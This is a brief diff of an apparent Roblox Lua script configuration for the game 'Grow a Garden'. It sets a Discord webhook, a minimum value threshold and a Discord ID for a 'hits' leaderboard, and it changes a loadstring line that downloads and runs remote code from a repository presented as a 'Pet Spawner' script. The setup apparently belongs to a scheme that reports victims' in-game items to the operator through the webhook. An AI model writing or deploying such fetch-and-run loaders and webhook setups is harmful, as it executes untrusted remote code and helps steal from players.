@@ -4,4 +4,4 @@ https://discord.com/api/webhooks/1403055951774486720/8YPgMqX3usvg-wu53sCvAUnY7wq
 MinimumValue = 1
 DiscordID = "1374361124224503899" -- optional if you wanna be in hits lb
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noidearlly2-cyber/PetSpawnerNonPatchedNoKey/refs/heads/main/Pet%20Spawner%20Script"))()
